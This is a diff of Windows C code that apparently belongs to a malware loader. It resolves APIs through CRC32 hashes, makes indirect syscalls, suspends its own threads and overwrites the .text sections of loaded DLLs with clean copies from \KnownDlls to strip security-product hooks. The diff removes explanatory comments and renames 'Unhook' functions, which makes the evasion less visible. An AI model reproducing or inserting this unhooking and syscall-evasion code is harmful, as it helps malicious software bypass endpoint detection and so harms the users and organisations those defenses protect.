@@ -2,11 +2,10 @@
 #include "Common.h"
 #include "Debug.h"
 
-// Globals variables
 WINAPI_FUNC WINAPIs = { 0 };
 NTAPI_FUNC NTAPIs = { 0 };
 
-BOOL IniUnhookDirectCalls() {
+BOOL IniDirectCalls() {
 
 	HMODULE hKernel32 = GetModuleHandleH(KERNEL32DLL_CRC32);
 
@@ -17,20 +16,19 @@ BOOL IniUnhookDirectCalls() {
 	WINAPIs.pThread32First = (fnThread32First)GetProcAddressH(hKernel32, Thread32First_CRC32);
 	WINAPIs.pThread32Next = (fnThread32Next)GetProcAddressH(hKernel32, Thread32Next_CRC32);
 
-	// another trick ;)
 	PVOID* ppElement = (PVOID*)&WINAPIs;
 	for (INT i = 0; i < sizeof(WINAPI_FUNC) / sizeof(PVOID); i++) {
 		if (!ppElement[i]) {
 #ifdef DEBUG
 			PRINTA("[!] InitializeDirectCalls Failed To Initialize Element Of Offset : %0.2d \n", i);
-#endif // DEBUG
+#endif
 			return FALSE;
 		}
 	}
 	return TRUE;
 }
 
-BOOL IniUnhookIndirectSyscalls() {
+BOOL IniIndirectSyscalls() {
 	
 	if (!FetchNtSyscall(NtOpenSection_CRC32, &NTAPIs.NtOpenSection))
 		return FALSE;
@@ -54,13 +52,8 @@ BOOL IniUnhookIndirectSyscalls() {
 	return TRUE;
 }
 
-/*
-	This function is used to suspend/resume the target process's threads, in an attempt to block it from executing any RW memory (when unhooking)
-*/
-
 BOOL SuspendAndResumeLocalThreads(enum THREADS State) {
 
-	// small trick ;)
 	DWORD						dwCurrentProcessId = __readgsqword(0x40);
 	DWORD						dwRunningThread = __readgsqword(0x48);
 	HANDLE						hSnapShot = INVALID_HANDLE_VALUE,
@@ -72,13 +65,13 @@ BOOL SuspendAndResumeLocalThreads(enum THREADS State) {
 
 #ifdef DEBUG
 	PRINTA("\n");
-#endif // DEBUG
+#endif
 
 	hSnapShot = WINAPIs.pCreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, NULL);
 	if (hSnapShot == INVALID_HANDLE_VALUE) {
 #ifdef DEBUG
 		PRINTA("[!] CreateToolhelp32Snapshot Failed With Error : %d \n", GetLastError());
-#endif // DEBUG
+#endif
 		SET_SYSCALL(NTAPIs.NtClose);
 		RunSyscall(hSnapShot);
 		return FALSE;
@@ -87,7 +80,7 @@ BOOL SuspendAndResumeLocalThreads(enum THREADS State) {
 	if (!WINAPIs.pThread32First(hSnapShot, &Thr32)) {
 #ifdef DEBUG
 		PRINTA("[!] Thread32First Failed With Error : %d \n", GetLastError());
-#endif // DEBUG
+#endif
 		SET_SYSCALL(NTAPIs.NtClose);
 		RunSyscall(hSnapShot);
 		return FALSE;
@@ -105,39 +98,39 @@ BOOL SuspendAndResumeLocalThreads(enum THREADS State) {
 			if (STATUS = RunSyscall(&hThread, GENERIC_ALL, &ObjAttr, &ClientId) != 0x00 ) {
 #ifdef DEBUG
 				PRINTA("[!] NtOpenThread Failed With Status : 0x%0.8X \n", STATUS);
-#endif // DEBUG
+#endif
 			}
 
 			if (State == SUSPEND_THREADS) {
 #ifdef DEBUG
 				PRINTA("\t\t>>> Suspending Thread Of Id : %d ... ", Thr32.th32ThreadID);
-#endif // DEBUG
+#endif
 
 				SET_SYSCALL(NTAPIs.NtSuspendThread);
 				if (hThread && (STATUS = RunSyscall(hThread, NULL)) != 0x00 ) {
 #ifdef DEBUG
 					PRINTA("[!] NtSuspendThread Failed With Status : 0x%0.8X \n", STATUS);
-#endif // DEBUG
+#endif
 				}
 #ifdef DEBUG
 				PRINTA("[+] DONE \n");
-#endif // DEBUG
+#endif
 
 			}
 
 			if (State == RESUME_THREADS) {
 #ifdef DEBUG
 				PRINTA("\t\t>>> Resuming Thread Of Id : %d ... ", Thr32.th32ThreadID);
-#endif // DEBUG
+#endif
 				SET_SYSCALL(NTAPIs.NtResumeThread);
 				if (hThread && (STATUS = RunSyscall(hThread, NULL)) != 0x00 ) {
 #ifdef DEBUG
 					PRINTA("[!] NtResumeThread Failed With Status : 0x%0.8X \n", STATUS);
-#endif // DEBUG
+#endif
 				}
 #ifdef DEBUG
 				PRINTA("[+] DONE \n");
-#endif // DEBUG
+#endif
 			}
 
 			SET_SYSCALL(NTAPIs.NtClose);
@@ -150,7 +143,7 @@ BOOL SuspendAndResumeLocalThreads(enum THREADS State) {
 
 #ifdef DEBUG
 	PRINTA("\n");
-#endif // DEBUG
+#endif
 
 	SET_SYSCALL(NTAPIs.NtClose);
 	RunSyscall(hSnapShot);
@@ -177,7 +170,7 @@ LPVOID GetDllFromKnownDll(IN PWSTR DllName) {
 	if (STATUS = RunSyscall(&hSection, SECTION_MAP_READ, &ObjAtr) != 0x00 ) {
 #ifdef DEBUG
 		PRINTW(L"[!] NtOpenSection Failed For \"%s\" With Status : 0x%0.8X [THAT'S PROB OK]\n", FullName, STATUS);
-#endif // DEBUG
+#endif
 		return NULL;
 	}
 
@@ -185,14 +178,12 @@ LPVOID GetDllFromKnownDll(IN PWSTR DllName) {
 	if (STATUS = RunSyscall(hSection, NtCurrentProcess(), &pModule, NULL, NULL, NULL, &ViewSize, 1, NULL, PAGE_READONLY) != 0x00 ) {
 #ifdef DEBUG
 		PRINTW(L"[!] NtMapViewOfSection Failed For \"%s\" With Status : 0x%0.8X \n", FullName, STATUS);
-#endif // DEBUG
+#endif
 		return NULL;
 	}
 
 	return pModule;
 }
-
-
 
 BOOL RefreshAllDlls() {
 
@@ -216,31 +207,22 @@ BOOL RefreshAllDlls() {
 	SIZE_T			sLocalTxtSize = NULL;
 	DWORD			dwOldPermission = NULL;
 
-
 	Head = &pPeb->LoaderData->InMemoryOrderModuleList;
-	// skipping the local image, because we know its not in \KnownDlls\ folder 
 	Next = Head->Flink->Flink;
 
-	// suspending all local threads, to prevent executing RW memory
 	if (!SuspendAndResumeLocalThreads(SUSPEND_THREADS))
 		return FALSE;
 
-	// loop through all dlls:
 	while (Next != Head) {
 
-		// getting the dll name:
 		PLDR_DATA_TABLE_ENTRY	pLdrData = (PLDR_DATA_TABLE_ENTRY)((PBYTE)Next - offsetof(LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks));
 		PUNICODE_STRING			DllName = (PUNICODE_STRING)((PBYTE)&pLdrData->FullDllName + sizeof(UNICODE_STRING));
 
-		// if not win32u.dll, because our rop gadgets are in 'win32u.dll' (and we need to keep it RX)
 		if (HASH(DllName->Buffer) != win32udll_CRC32 && HASH(DllName->Buffer) != WIN32UDLL_CRC32) {
-			// getting the dll's handle from \KnownDlls\ : in case it returned null, that's ok, because the dll may not be in KnownDlls after all ...
 			KnownDllDllModule = GetDllFromKnownDll(DllName->Buffer);
 			CurrentDllModule = (LPVOID)(pLdrData->DllBase);
 
-			// if we had the dll mapped with a valid address from KnownDlls:
 			if (KnownDllDllModule != NULL && CurrentDllModule != NULL) {
-				// get the dos & nt headers of our local dll
 				PIMAGE_DOS_HEADER CurrentDllImgDosHdr = (PIMAGE_DOS_HEADER)CurrentDllModule;
 				if (CurrentDllImgDosHdr->e_magic != IMAGE_DOS_SIGNATURE) {
 					return FALSE;
@@ -249,7 +231,6 @@ BOOL RefreshAllDlls() {
 				if (CurrentDllImgNtHdr->Signature != IMAGE_NT_SIGNATURE) {
 					return FALSE;
 				}
-				// get the address of the module's txt section & its size & calculate the knowndll txt section address
 				for (INT i = 0; i < CurrentDllImgNtHdr->FileHeader.NumberOfSections; i++) {
 					PIMAGE_SECTION_HEADER pImgSec = (PIMAGE_SECTION_HEADER)((DWORD_PTR)IMAGE_FIRST_SECTION(CurrentDllImgNtHdr) + ((DWORD_PTR)IMAGE_SIZEOF_SECTION_HEADER * i));
 					if ((*(ULONG*)pImgSec->Name | 0x20202020) == 'xet.') {
@@ -258,12 +239,10 @@ BOOL RefreshAllDlls() {
 						pRemoteTxtAddress = (PVOID)((ULONG_PTR)KnownDllDllModule + pImgSec->VirtualAddress);
 					}
 				}
-				// small check here ...
 				if (sLocalTxtSize == NULL || pLocalTxtAddress == NULL || pRemoteTxtAddress == NULL) {
 					return FALSE;
 				}
 
-				// if both have the same bytes, its a valid text section
 				if (*(ULONG_PTR*)pLocalTxtAddress != *(ULONG_PTR*)pRemoteTxtAddress)
 					return FALSE;
 
@@ -273,13 +252,13 @@ BOOL RefreshAllDlls() {
 #ifdef DEBUG
 				PRINTW(L"\n[i] Replacing .txt of %s ... ", DllName->Buffer);
 				PRINTA("\n\t> pLocalTxtAddress : 0x%p \n\t> pRemoteTxtAddress : 0x%p \n", pLocalTxtAddress, pRemoteTxtAddress);
-#endif // DEBUG
+#endif
 				
 				SET_SYSCALL(NTAPIs.NtProtectVirtualMemory);
 				if (STATUS = RunSyscall(NtCurrentProcess(), &pAddress, &sSize, PAGE_READWRITE, &dwOldPermission) != 0x00) {
 #ifdef DEBUG
 					PRINTA("[!] NtProtectVirtualMemory [1] Failed With Status : 0x%0.8X \n", STATUS);
-#endif // DEBUG
+#endif
 					return FALSE;
 				}
 
@@ -289,35 +268,29 @@ BOOL RefreshAllDlls() {
 				if (STATUS = RunSyscall(NtCurrentProcess(), &pAddress, &sSize, dwOldPermission, &dwOldPermission) != 0x00) {
 #ifdef DEBUG
 					PRINTA("[!] NtProtectVirtualMemory [2] Failed With Status : 0x%0.8X \n", STATUS);
-#endif // DEBUG
+#endif
 					return FALSE;
 				}
 
-				// unmap the KnownDlls dll
 				SET_SYSCALL(NTAPIs.NtUnmapViewOfSection);
 				if (STATUS = RunSyscall(NtCurrentProcess(), KnownDllDllModule) != 0x00 ) {
 #ifdef DEBUG
 					PRINTA("[!] NtUnmapViewOfSection Failed With Status : 0x%0.8X \n", STATUS);
-#endif // DEBUG
+#endif
 					return FALSE;
 				}
-
 #ifdef DEBUG
 				PRINTA("[+] DONE \n");
-#endif // DEBUG
-
+#endif
 			}
 
 		}
 
-		// continue to the next dll ...
 		Next = Next->Flink;
 	}
 
-	// resuming all local threads
 	if (!SuspendAndResumeLocalThreads(RESUME_THREADS))
 		return FALSE;
-
 
 	return TRUE;
 }
